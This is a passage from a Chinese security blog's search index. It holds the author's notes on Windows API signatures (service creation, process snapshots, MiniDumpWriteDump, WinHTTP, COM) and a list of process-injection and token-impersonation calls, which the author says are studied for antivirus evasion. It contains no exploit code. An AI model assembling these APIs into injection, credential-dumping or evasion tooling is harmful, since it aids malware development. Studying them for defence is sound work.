lpMachineName \u6307\u5b9a\u8ba1\u7b97\u673a\u7684\u540d\u5b57\u3002\u82e5\u4e3aNULL\u5219\u6307\u5411\u672c\u5730\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668 lpDatabaseName \u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u7684\u6570\u636e\u5e93\u540d\u3002\u4e00\u822c\u8bbe\u4e3a SERVICES_ACTIVE_DATABASE \u3002\u82e5\u4e3aNULL\u5219\u9ed8\u8ba4\u6253\u5f00 SERVICES_ACTIVE_DATABASE dwDesiredAccess \u5bf9\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u7684\u6743\u9650\u8bbe\u7f6e\u3002\u53c2\u6570\u6e05\u5355: https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights \u82e5\u6267\u884c\u6210\u529f\u5219\u8fd4\u56de\u670d\u52a1\u7ba1\u7406\u5668\u6570\u636e\u5e93\u7684\u53e5\u67c4\u3002\u53cd\u4e4b\u5219NULL\u3002 \u521b\u5efa\u4e00\u4e2a\u670d\u52a1\u5e76\u628a\u5b83\u52a0\u5165\u5230\u670d\u52a1\u7ba1\u7406\u5668\u6570\u636e\u5e93\uff1a CreateServiceA SC_HANDLE CreateServiceA( SC_HANDLE hSCManager, LPCSTR lpServiceName, LPCSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR lpDependencies, LPCSTR lpServiceStartName, LPCSTR lpPassword ); hSCManager \u670d\u52a1\u7ba1\u7406\u5668\u6570\u636e\u5e93\u53e5\u67c4\u3002\u53ef\u7531OpenSCManagerA\u83b7\u5f97\u3002\u53e5\u67c4\u6743\u9650\u5fc5\u987b\u6709 SC_MANAGER_CREATE_SERVICE lpServiceName \u8981\u521b\u5efa\u7684\u670d\u52a1\u540d\u3002 lpDisplayName \u7528\u6237\u754c\u9762\u7a0b\u5e8f \u7528\u6765\u6807\u8bc6\u670d\u52a1\u7684 \u663e\u793a\u540d\u79f0 \uff0c\u53ef\u4e0elpServiceName\u4e00\u81f4 dwDesiredAccess \u5bf9\u670d\u52a1\u7ba1\u7406\u5668\u7684\u6743\u9650\u3002\u53c2\u6570\u6e05\u5355\u5728\u4e0a\u9762 dwServiceType \u521b\u5efa\u7684\u670d\u52a1\u7684\u7c7b\u578b\u3002\uff08\u76f4\u63a5\u590d\u5236\u7c98\u8d34\u53c2\u6570\u5427 Value Meaning \u200b SERVICE_ADAPTER 0x00000004 Reserved. \u200b SERVICE_FILE_SYSTEM_DRIVER 0x00000002 File system driver service. \u200b SERVICE_KERNEL_DRIVER 0x00000001 Driver service. \u200b SERVICE_RECOGNIZER_DRIVER 0x00000008 Reserved. \u200b SERVICE_WIN32_OWN_PROCESS 0x00000010 Service that runs in its own process. \u200b SERVICE_WIN32_SHARE_PROCESS 0x00000020 Service that shares a process with one or more other services. For more information, see Service Programs . \u200b SERVICE_USER_OWN_PROCESS 0x00000050 The service runs in its own process under the logged-on user account. \u200b SERVICE_USER_SHARE_PROCESS 0x00000060 The service shares a process with one or more other services that run under the logged-on user account. If you specify either SERVICE_WIN32_OWN_PROCESS or SERVICE_WIN32_SHARE_PROCESS , and the service is running in the context of the LocalSystem account , you can also specify the following value. Value Meaning \u200b SERVICE_INTERACTIVE_PROCESS 0x00000100 The service can interact with the desktop.For more information, see Interactive Services . dwStartType \u670d\u52a1\u7684\u5f00\u59cb\u9009\u9879\uff0c\u53c2\u6570\u5982\u4e0b Value Meaning \u200b SERVICE_AUTO_START 0x00000002 A service started automatically by the service control manager during system startup. For more information, see Automatically Starting Services . \u200b SERVICE_BOOT_START 0x00000000 A device driver started by the system loader. This value is valid only for driver services. \u200b SERVICE_DEMAND_START 0x00000003 A service started by the service control manager when a process calls the StartService function. For more information, see Starting Services on Demand . \u200b SERVICE_DISABLED 0x00000004 A service that cannot be started. Attempts to start the service result in the error code ERROR_SERVICE_DISABLED . \u200b SERVICE_SYSTEM_START 0x00000001 A device driver started by the IoInitSystem function. This value is valid only for driver services. dwErrorContriol \u670d\u52a1\u5bf9\u4e8e\u9519\u8bef\u7684\u5bb9\u5fcd\u7a0b\u5ea6\u3002 lpBinaryPathName \u670d\u52a1\u7684\u7edd\u5bf9\u8def\u5f84\u3002 lpLoadOrderGroup \u670d\u52a1\u6240\u5c5e\u7684\u52a0\u8f7d\u6392\u5e8f\u7ec4\u540d\u79f0\u3002\u5982\u679c\u670d\u52a1\u4e0d\u5c5e\u4e8e\u4efb\u4f55\u4e00\u4e2a\u7ec4\u5219\u586bNULL\u6216\u7a7a\u5b57\u7b26 lpdwTagId \u4e00\u4e2a\u6307\u5411\u53d8\u91cf\u7684\u6307\u9488\uff0c\u8be5\u53d8\u91cf\u63a5\u6536\u5728lpLoadOrderGroup\u53c2\u6570\u4e2d\u6307\u5b9a\u7684\u7ec4\u4e2d\u552f\u4e00\u7684\u6807\u8bb0\u503c\u3002 \u4e00\u822c\u7f6eNULL lpDependencies \u4e00\u4e2a\u4ee5null\u7ed3\u5c3e\u7684\u6307\u5411\u670d\u52a1\u6216\u8005\u52a0\u8f7d\u987a\u5e8f\u7ec4\u7684\u6307\u9488\uff0c\u5728\u5f53\u524d\u670d\u52a1\u542f\u52a8\u524d\u5fc5\u987b\u5148\u542f\u52a8\u8be5\u9879\u6307\u5411\u7684\u670d\u52a1\u6216\u52a0\u8f7d\u987a\u5e8f\u7ec4\uff0c\u5373\u542f\u52a8\u5f53\u524d\u670d\u52a1\u7684\u4f9d\u8d56\u9879\u3002\u82e5\u670d\u52a1\u4e0d\u9700\u8981\u4f9d\u8d56\u9879\u5219\u7f6eNULL lpServiceStartName \u670d\u52a1\u8fd0\u884c\u7684\u8d26\u6237\u3002\u82e5\u4e3aNULL\u5219\u7528LocalSystem Account\u8d26\u6237\uff08\u5373SYSTEM) lpPassword \u8d26\u6237\u7684\u5bc6\u7801\u3002\u82e5\u4e3aLocalSystemAccount\u5219\u586bNULL\uff08SYSTEM\u8d26\u6237\u6ca1\u6709\u5bc6\u7801\uff09 \u6210\u529f\u5219\u8fd4\u56de\u670d\u52a1\u53e5\u67c4\uff0c\u53cd\u4e4b\u5219NULL \u6253\u5f00\u4e00\u4e2a\u670d\u52a1\u5e76\u83b7\u5f97\u53e5\u67c4: OpenServiceA SC_HANDLE OpenServiceA( SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess ); hSCManager \u6307\u5411\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u6570\u636e\u5e93\u7684\u53e5\u67c4\u3002 lpServiceName \u670d\u52a1\u540d\uff0c\u6ce8\u610f\u4e0d\u662flpDisplayName dwDesiredAccess \u5bf9\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u7684\u6743\u9650 \u6210\u529f\u5219\u8fd4\u56de\u670d\u52a1\u53e5\u67c4\uff0c\u53cd\u4e4b\u5219NULL \u5411\u4e00\u4e2a\u670d\u52a1\u53d1\u9001\u63a7\u5236\u6307\u4ee4:ControlService BOOL ControlService( SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus ); hService \u6307\u5411\u670d\u52a1\u7684\u53e5\u67c4 dwControl \u63a7\u5236\u6307\u4ee4\u3002\u8be6\u60c5\u53c2\u8003 https://docs.microsoft.com/zh-cn/windows/win32/api/winsvc/nf-winsvc-controlservice?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINSVC%252FControlService);k(ControlService);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue lpServiceStatus \u6307\u5411 SERVICE_STATUS \u7ed3\u6784\u7684\u6307\u9488\uff0c\u8be5\u7ed3\u6784\u7528\u4e8e\u63a5\u6536\u670d\u52a1\u62a5\u544a\u7ed9\u670d\u52a1\u7ba1\u7406\u5668\u7684\u6700\u65b0\u72b6\u6001\u3002 \u4f7f\u670d\u52a1\u4e0eSCM\u94fe\u63a5\uff1a StartServiceCtrlDispatcherA BOOL StartServiceCtrlDispatcherA( const SERVICE_TABLE_ENTRYA *lpServiceStartTable ); lpServiceStartTable \u6307\u5411\u4e00\u4e2a SERVICE_TABLE_ENTRY \u7ed3\u6784\uff0c\u5176\u5305\u542b\u4e86\u6bcf\u4e2a\u670d\u52a1\u7684\u5165\u53e3\u70b9\u3002\u8be5\u7ed3\u6784\u6700\u540e\u4e00\u4e2a\u5165\u53e3\u70b9\u5fc5\u987b\u662fNULL\u6765\u8868\u793a\u8be5\u7ed3\u6784\u5df2\u7ed3\u675f\u3002 \u8fd9\u4e2a\u7ed3\u6784\u7684\u5b9a\u4e49\u5982\u4e0b typedef struct _SERVICE_TABLE_ENTRYW { LPWSTR lpServiceName; LPSERVICE_MAIN_FUNCTIONW lpServiceProc; }SERVICE_TABLE_ENTRYW, *LPSERVICE_TABLE_ENTRYW; \u5f53SCM\u5f00\u59cb\u4e00\u4e2a\u670d\u52a1\u8fdb\u7a0b\u65f6\uff0c\u4fbf\u5728\u7b49\u5f85\u670d\u52a1\u8c03\u7528StartServiceCtrlDispatcherA \u51fd\u6570\uff0c\u82e5\u8be5\u51fd\u6570\u957f\u65f6\u95f4\u6ca1\u6709\u8c03\u7528\uff08\u4e00\u822c\u4e3a30s)\uff0c\u5219\u670d\u52a1\u4f1a\u88ab\u5f3a\u884c\u5173\u95ed\u3002\u76f4\u5230\u6240\u6709\u8be5\u51fd\u6570\u6307\u5b9a\u7684\u670d\u52a1\u8fdb\u5165SERVICE_STOPPED\u9636\u6bb5\uff0c\u8fd9\u4e2a\u51fd\u6570\u624d\u4f1a\u8fd4\u56de\u503c\u3002 \u6ce8\u518c\u4e00\u4e2a\u51fd\u6570\u6765\u5904\u7406\u670d\u52a1\u63a7\u5236\u8bf7\u6c42: RegisterServiceCtrlHandlerA SERVICE_STATUS_HANDLE RegisterServiceCtrlHandlerA( LPCSTR lpServiceName, LPHANDLER_FUNCTION lpHandlerProc ); lpServiceName \u670d\u52a1\u7684\u540d\u5b57\u3002 lpHandlerProc \u4e00\u4e2a\u6307\u9488\uff0c\u6307\u5411\u8981\u88ab\u6ce8\u518c\u7684handler\u51fd\u6570 \u82e5\u6210\u529f\uff0c\u5219\u8fd4\u56de\u670d\u52a1\u72b6\u6001\u53e5\u67c4\uff0c\u82e5\u5931\u8d25\u5219\u8fd4\u56de0 \u8fd9\u4e2a\u51fd\u6570\u7684\u4e3b\u8981\u76ee\u7684\u662f \u53ef\u4ee5\u8ba9\u4e00\u4e2a\u670d\u52a1\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u88ab\u6765\u81ea\u5176\u4ed6\u5730\u65b9\u7684\u63a7\u5236\u6307\u4ee4\u6240\u63a7\u5236\uff0c\u5e76\u6839\u636e\u81ea\u5df1\u5b9a\u4e49\u7684\u51fd\u6570\u505a\u51fa\u5bf9\u5e94\u7684\u884c\u4e3a \u66f4\u65b0\u670d\u52a1\u7684\u72b6\u6001\u4fe1\u606f: SetServiceStatus BOOL SetServiceStatus( SERVICE_STATUS_HANDLE hServiceStatus, LPSERVICE_STATUS lpServiceStatus ); hServiceStatus \u6307\u5411\u670d\u52a1\u72b6\u6001\u53e5\u67c4\uff0c\u8fd9\u4e2a\u53e5\u67c4\u7531RegisterServiceCtrlHandlerA \u7b49\u51fd\u6570\u8fd4\u56de lpServiceStatus \u4e00\u4e2a\u6307\u9488\uff0c\u6307\u5411 SERVICE_STATUS \u7ed3\u6784\uff0c\u8fd9\u4e2a\u7ed3\u6784\u8bb0\u5f55\u4e86\u670d\u52a1\u7684\u72b6\u6001 \u5feb\u7167 \u4ee5\u4e0b\u51fd\u6570\u6216\u7ed3\u6784\u57fa\u672c\u4e0a\u90fd\u7528\u5230\u4e86\u53e6\u4e00\u4e2a\u5934\u6587\u4ef6Tlhelp32.h \u4e3a\u8fdb\u7a0b\u521b\u5efa\u5feb\u7167\u6587\u4ef6(\u8f6c\u50a8): CreateToolhelp32Snapshot HANDLE CreateToolhelp32Snapshot( DWORD dwFlags, DWORD th32ProcessID ); dwFlags \u8f6c\u50a8\u53c2\u6570\uff0c\u7528\u4e8e\u6307\u5b9a\u8f6c\u50a8\u54ea\u4e9b\u4fe1\u606f\u4ee5\u53ca\u6307\u5b9a\u8fd4\u56de\u7684\u53e5\u67c4\u7684\u4e00\u4e9b\u4fe1\u606f \u8be6\u7ec6\u53c2\u6570 https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot th32ProcessID \u8981\u88ab\u8f6c\u50a8\u7684\u8fdb\u7a0b\u7684PID\u3002\u7f6e0\u5219\u6307\u5b9a\u5f53\u524d\u8fdb\u7a0b\uff0c\u5f53dwFlags\u4e3a TH32CS_SNAPHEAPLIST , TH32CS_SNAPMODULE , TH32CS_SNAPMODULE32 , or TH32CS_SNAPALL \u65f6\uff0c\u8be5\u503c\u624d\u8868\u793a\u8981\u88ab\u8f6c\u50a8\u7684\u8fdb\u7a0bPID\uff0c\u5426\u5219\u8be5\u503c\u4f1a\u88ab\u5ffd\u7565\u5e76\u8f6c\u50a8\u6240\u6709\u8fdb\u7a0b \u51fd\u6570\u6210\u529f\u8fd4\u56de\u5feb\u7167\u7684\u53e5\u67c4\uff0c\u5426\u5219\u8fd4\u56de INVALID_HANDLE_VALUE \u68c0\u7d22\u5feb\u7167\u4e2d\u9047\u5230\u7684\u7b2c\u4e00\u4e2a\u8fdb\u7a0b\u7684\u4fe1\u606f\uff1a Process32First BOOL Process32First( HANDLE hSnapshot, LPPROCESSENTRY32 lppe ); hSnapshot \u5feb\u7167\u53e5\u67c4\uff0c\u7531CreateToolhelp32napshot\u8fd4\u56de lppe \u6307\u5411PROCESSENTRY32\u7ed3\u6784\u3002\u8be5\u7ed3\u6784\u7528\u4e8e\u4fdd\u5b58\u8fdb\u7a0b\u4fe1\u606f\uff0c\u5728\u8fdb\u884c\u8be5\u51fd\u6570\u524d\uff0cPROCESSENTRY32\u7684dwSize\u5c5e\u6027\u5fc5\u987b\u5b9a\u4e49\u597d\u3002 \u68c0\u7d22\u5feb\u7167\u4e2d\u4e0b\u4e00\u4e2a\u8fdb\u7a0b\u7684\u4fe1\u606f: Process32Next BOOL Process32Next( HANDLE hSnapshot, LPPROCESSENTRY32 lppe ); hSnapshot \u5feb\u7167\u53e5\u67c4\uff0c\u7531CreateToolhelp32napshot\u8fd4\u56de lppe \u6307\u5411PROCESSENTRY32\u7ed3\u6784\u3002\u8be5\u7ed3\u6784\u7528\u4e8e\u4fdd\u5b58\u8fdb\u7a0b\u4fe1\u606f\uff0c\u5728\u8fdb\u884c\u8be5\u51fd\u6570\u524d\uff0cPROCESSENTRY32\u7684dwSize\u5c5e\u6027\u5fc5\u987b\u5b9a\u4e49\u597d\u3002 \u5c06\u67d0\u4e2a\u8fdb\u7a0b\u8f6c\u50a8\u4e3a\u5feb\u7167\u5199\u5165\u6587\u4ef6: MiniDumpWriteDump \u5934\u6587\u4ef6 DbgHelp.h BOOL MiniDumpWriteDump( HANDLE hProcess, DWORD ProcessId, HANDLE hFile, MINIDUMP_TYPE DumpType, PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam, PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, PMINIDUMP_CALLBACK_INFORMATION CallbackParam ); hProcess \u8fdb\u7a0b\u53e5\u67c4 processid \u8fdb\u7a0b\u7684PID hFile \u6587\u4ef6\u53e5\u67c4\uff0c\u6307\u5b9a\u5199\u5165\u90a3\u4e2a\u6587\u4ef6 DumpType \u6307\u5b9a\u4ee5\u4f55\u79cd\u5f62\u5f0f\u5199\u5165\u6587\u4ef6\uff0c\u53c2\u6570\u53c2\u8003: https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ne-minidumpapiset-minidump_type ExceptionParam \u6307\u9488\uff0c\u6307\u5411 MINIDUMP_EXCEPTION_INFORMATION \u7ed3\u6784\u7528\u4e8e\u63cf\u8ff0\u53d1\u751f\u7684\u5f02\u5e38\u3002\u5982\u679c\u4e3aNULL\uff0c\u5219\u8868\u793a\u8f6c\u50a8\u6587\u4ef6\u4e2d\u4e0d\u5305\u542b\u5f02\u5e38\u4fe1\u606f UserStreamParam \u6307\u9488\uff0c\u6307\u5411 MINIDUMP_USER_STREAM_INFORMATION \u7ed3\u6784\uff0c\u8fd9\u4e2a\u7ed3\u6784\u4fdd\u5b58\u7528\u6237\u6570\u636e\u6d41\u4fe1\u606f\u3002\u4e00\u822c\u7f6eNULL CallbackParam \u6307\u9488\uff0c\u6307\u5411 MINIDUMP_CALLBACK_INFORMATION \u7ed3\u6784\uff0c\u8be5\u7ed3\u6784\u4fdd\u5b58\u56de\u8c03\u51fd\u6570\u7684\u4fe1\u606f\uff0c\u4e00\u822c\u7f6eNULL HTTP\u8bf7\u6c42\uff0c\u591a\u6570\u51fd\u6570\u5305\u542b\u5728winhttp.h\u4e2d \u5927\u6d41\u7a0b winhttpopen:\u8fd4\u56de WinHTTP-session \u53e5\u67c4 WINHTTPAPI HINTERNET WinHttpOpen( LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags ); pszAgentW \u6307\u9488\uff0c\u6307\u5411\u4e00\u4e2a\u5b57\u7b26\u4e32.\u8be5\u5b57\u7b26\u4e32\u5728http\u901a\u4fe1\u4e2d\u88ab\u7528\u4f5cuser agent dwAccessType http\u8bf7\u6c42\u65b9\u5f0f\uff0c\u5176\u503c\u6709\u5982\u4e0b\uff0c\u4e3b\u8981\u662f\u4ee3\u7406\u76f8\u5173 WINHTTP_ACCESS_TYPE_DEFAULT_PROXY WINHTTP_ACCESS_TYPE_NAMED_PROXY WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY WINHTTP_ACCESS_TYPE_NO_PROXY \u4e0d\u4f7f\u7528\u4ee3\u7406\u8fdb\u884c\u901a\u8baf pszProxyW \u6307\u9488\uff0c\u5f53dwAccessType\u4e3a WINHTTP_ACCESS_TYPE_NAMED_PROXY \u65f6\u6307\u5411\u4ee3\u7406\u670d\u52a1\u5668\u540d\u5b57\u3002\u5426\u5219\u53d6 WINHTTP_NO_PROXY_NAME \u503c pszProxyBypassW \u6307\u9488\uff0c\u6307\u5411\u5b57\u7b26\u4e32\uff0c \u5f53dwAccessType\u4e3a WINHTTP_ACCESS_TYPE_NAMED_PROXY \u65f6\u6307\u5411\u4e0d\u60f3\u8d70\u4ee3\u7406\u7684IP\u5730\u5740\u6216\u4e3b\u673a\u540d\u3002\u5426\u5219\u53d6 WINHTTP_NO_PROXY_BYPASS \u503c dwFlags \u4e00\u822c\u53d60 WinHttpConnect \uff1a\u8fd4\u56de \u94fe\u63a5 \u53e5\u67c4\uff08 handle to an HTTP session for that initial target. \uff09 WINHTTPAPI HINTERNET WinHttpConnect( HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved ); hSession WinHttpOpen \u65b9\u6cd5\u8fd4\u56de\u7684\u53e5\u67c4 pswzServerName \u6307\u9488\uff0c\u6307\u5411\u9700\u8981\u8bf7\u6c42\u7684\u670d\u52a1\u5668\u7684IP\u6216\u4e3b\u673a\u540d\u7684\u5b57\u7b26\u4e32 nServerPort \u6307\u5b9a\u8bf7\u6c42\u7aef\u53e3 dwReserved \u7f6e0 WinHttpOpenRequest \uff1a\u521b\u5efaHTTP\u8bf7\u6c42\u53e5\u67c4 WINHTTPAPI HINTERNET WinHttpOpenRequest( HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes, DWORD dwFlags ); hConnect WinHttpConnect\u8fd4\u56de\u7684\u53e5\u67c4 pwszVerb \u6307\u5b9aHTTP\u8bf7\u6c42\u65b9\u6cd5 pwszObjectName \u6307\u5b9a\u8bf7\u6c42\u8d44\u6e90\u7684\u8def\u5f84 pwszVersion \u6307\u5b9aHTTP\u7248\u672c pwszReferrer \u591a\u6570\u60c5\u51b5\u53ef\u8bbe\u7f6e\u4e3a WINHTTP_NO_REFERER ppwszAcceptTypes \u6307\u5b9a\u5a92\u4f53\u7c7b\u578b\uff0c\u53ef\u8bbe\u7f6e\u4e3a WINHTTP_DEFAULT_ACCEPT_TYPES dwFlags \u901a\u5e38\u7f6e0 WinHttpAddRequestHeaders \u8bbe\u7f6eHTTP\u5934 BOOLAPI WinHttpAddRequestHeaders( HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers ); hRequest WinHttpOpenRequest\u8fd4\u56de\u7684\u53e5\u67c4 lpszHeaders \u6307\u5411\u5b57\u7b26\u4e32\u7684\u6307\u9488\uff0c\u5b57\u7b26\u4e32\u91cc\u5305\u542b\u4e86\u8981\u9644\u52a0\u5230http\u8bf7\u6c42\u4e0a\u7684\u5934\u90e8\u4fe1\u606f\u3002\u6bcf\u4e2a\u5934\u90e8\u4e4b\u95f4\u7528 CR/LF \u9694\u5f00 dwHeadersLength \u5934\u90e8\u7684\u957f\u5ea6 dwModifiers \u4e00\u4e9b\u529f\u80fd\u4fee\u9970\uff0c\u4e00\u822c\u53ef\u4ee5\u7f6e WINHTTP_ADDREQ_FLAG_ADD WinHttpSendRequest \u53d1\u9001HTTP\u8bf7\u6c42 BOOLAPI WinHttpSendRequest( HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext ); hRequest WinHttpOpenRequest\u8fd4\u56de\u7684\u53e5\u67c4 lpszHeaders \u9644\u52a0\u7684HTTP\u5934\uff0c\u5982\u679c\u6ca1\u6709\u60f3\u9644\u52a0\u7684\u5934\u5c31\u7f6e0 dwHeadersLength lpszHeaders \u6307\u5b9a\u7684\u5934\u7684\u5b57\u7b26\u4e32\u5927\u5c0f lpOptional \u4e00\u4e2a\u6307\u9488\u3002\u6307\u5411\u4e00\u4e2a\u7f13\u51b2\u533a\uff0c\u5f53\u4e2d\u5305\u62ec\u53ef\u9009\u7684\u6570\u636e\u53d1\u9001\u540e\uff0c\u9a6c\u4e0a\u8bf7\u6c42\u6807\u5934\u3002\u8be5\u53c3\u6570\u901a\u7ecf\u5e38\u4f7f\u7528\u4e8ePOST\u548cPUT\u64cd\u4f5c\u3002 \uff08\u6211\u7406\u89e3\u4e3a\u4f20\u7684\u53c2\u6570\uff09 dwOptionalLength \u989d\u5916\u5185\u5bb9\u7684\u957f\u5ea6 dwTotalLength \u603b\u957f\u5ea6 dwContext \u901a\u5e38\u7f6e0 WinHttpReceiveResponse \uff1a\u7b49\u5f85http\u56de\u5e94 WINHTTPAPI BOOL WinHttpReceiveResponse( HINTERNET hRequest, LPVOID lpReserved ); hRequest WinHttpOpenRequest \u8fd4\u56de\u7684\u53e5\u67c4 lpReserved \u7f6eNULL \u4e3b\u8981\u4f5c\u7528\u662f\u5982\u679c\u6709\u56de\u5e94\uff0c\u5219\u4f1a\u8fd4\u56detrue\u3002 WinHttpQueryDataAvailable \uff1a\u8fd4\u56deHTTP\u56de\u5e94\u5185\u5bb9\u7684\u5927\u81f4\u4fe1\u606f BOOLAPI WinHttpQueryDataAvailable( HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable ); lpdwNumberOfBytesAvailable \u7f6eNULL\uff0c\u5176\u7528\u6765\u63a5\u6536\u5185\u5bb9\u957f\u5ea6 WinHttpReadData \u8bfb\u53d6HTTP\u56de\u5e94\u5185\u5bb9 BOOLAPI WinHttpReadData( HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead ); lpBuffer \u6307\u5b9a\u4e00\u7247\u7f13\u51b2\u533a\uff0c\u56de\u5e94\u7684\u6570\u636e\u4f1a\u5b58\u653e\u5230\u6b64\u5904 dwNumberOfBytesToRead \u7f13\u51b2\u533a\u5927\u5c0f\u957f\u5ea6 lpdwNumberOfBytesRead \u7528\u4e8e\u5b58\u50a8\u56de\u5e94\u7684\u5b57\u8282\u6570\uff0c\u5728\u4f7f\u7528\u8be5\u51fd\u6570\u65f6\u8be5\u503c\u987b\u4e3aNULL \u8bf4\u767d\u4e86\uff0c\u5c31\u662f\u4ee5C\u6216c++\u7b49\u8bed\u8a00\u4e3a\u8f7d\u4f53\uff0c\u8c03\u7528\u5404\u79cdWindows API\u5b8c\u6210\u7f16\u7a0b \u5b66\u8fd9\u4e2a\u7684\u76ee\u7684\u662f\u56e0\u4e3a\u8981\u63a5\u89e6\u514d\u6740\uff0c\u9700\u8981\u66f4\u6df1\u5c42\u6b21\u7684\u4e86\u89e3Windows\u7684\u4e00\u4e9b\u673a\u5236\u3002 COM\u76f8\u5173 CoInitializeEx \uff1a\u521b\u5efaCOM\u73af\u5883 HRESULT CoInitializeEx( LPVOID pvReserved, DWORD dwCoInit ); pvReserved \u5fc5\u987b\u586bNULL dwCoInit \u521d\u59cb\u5316\u9009\u9879\uff1a COINIT_APARTMENTTHREADED Initializes the thread for apartment-threaded object concurrency (see Remarks).\uff08\u542f\u52a8\u5355\u7ebf\u7a0b\u5bf9\u8c61\uff09 COINIT_MULTITHREADED Initializes the thread for multithreaded object concurrency (see Remarks).\uff08\u542f\u52a8\u591a\u7ebf\u7a0b\u5bf9\u8c61\uff09 COINIT_DISABLE_OLE1DDE Disables DDE for OLE1 support. COINIT_SPEED_OVER_MEMORY Increase memory usage in an attempt to increase performance. \u4e00\u4e9b\u6570\u636e\u7c7b\u578b NTSTATUS NTSTATUS\u662f\u7528\u4e8e\u7cfb\u7edf\u63d0\u4f9b\u7684\u72b6\u6001\u7801\u503c\u7684\u6807\u51c632\u4f4d\u6570\u636e\u7c7b\u578b\u3002 STATUS_SEVERITY_SUCCESS0x0 Success STATUS_SEVERITY_INFORMATIONAL0x1 Informational STATUS_SEVERITY_WARNING0x2 Warning STATUS_SEVERITY_ERROR0x3 Error HRESULT \u7528\u4e8e\u63cf\u8ff0\u9519\u8bef\u6216\u8b66\u544a\u768432\u4f4d\u503c\u3002","title":"\u7528\u8fc7\u7684WINDOWS_API\u8bb0\u5f55"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#windows_api","text":"","title":"\u7528\u8fc7\u7684WINDOWS_API\u8bb0\u5f55"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#_1","text":"API:\u6536\u5f55\u4e00\u4e0b\u8c03\u8fc7\u7684API \u8fdb\u7a0b\u4e0e\u5185\u5b58 \u6253\u5f00\u4e00\u4e2a\u5df2\u5b58\u5728\u7684\u672c\u5730\u8fdb\u7a0b:OpenProcess \u5728\u6307\u5b9a\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u4fdd\u7559\uff0c\u5f00\u8f9f\uff0c\u7981\u7528\u4e00\u6bb5\u533a\u57df : VirtualAllocEx \u5728\u6307\u5b9a\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u91ca\u653e\u6216decommit\u4e00\u6bb5\u533a\u57df : VirtualFreeEx \u5411\u6307\u5b9a\u8fdb\u7a0b\u7684\u5185\u5b58\u533a\u57df\u5199\u5165: WriteProcessMemory \u5728\u4e00\u4e2a\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\u4e2d\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\uff1aCreateRemoteThread \u5173\u95ed\u4e00\u4e2a\u53e5\u67c4:CloseHandle RtlSecureZeroMemory \uff1a\u4ee5\u5b89\u5168\u65b9\u5f0f\u75280\u586b\u5145\u5185\u5b58 \u4ee4\u724c\u4e0e\u547d\u540d\u7ba1\u9053 \u521b\u5efa\u547d\u540d\u7ba1\u9053\u53e5\u67c4:CreateNamedPipeA \u5f00\u542f\u4e00\u4e2a\u547d\u540d\u7ba1\u9053\u7b49\u5f85\u94fe\u63a5: ConnectNamedPipe \u6a21\u62df\u4e00\u4e2a\u547d\u540d\u7ba1\u9053\u5ba2\u6237\u7aef:ImpersonateNamedPipeClient \u83b7\u53d6\u5f53\u524d\u7ebf\u7a0b\u4ee4\u724c\u53e5\u67c4: GetCurrentThreadToken \u4ee5\u4ee4\u724c\u521b\u5efa\u4e00\u4e2a\u8fdb\u7a0b\uff081\uff09: CreateProcessWithTokenW \u4ee5\u4ee4\u724c\u521b\u5efa\u4e00\u4e2a\u8fdb\u7a0b\uff082\uff09: CreateProcessAsUserA \u4e3a\u5df2\u5b58\u5728\u7684Token\u521b\u5efa\u526f\u672c: DuplicateTokenEx \u6587\u4ef6IO \u83b7\u5f97\u6587\u4ef6\u53e5\u67c4\uff1aGetMoudleHandleA 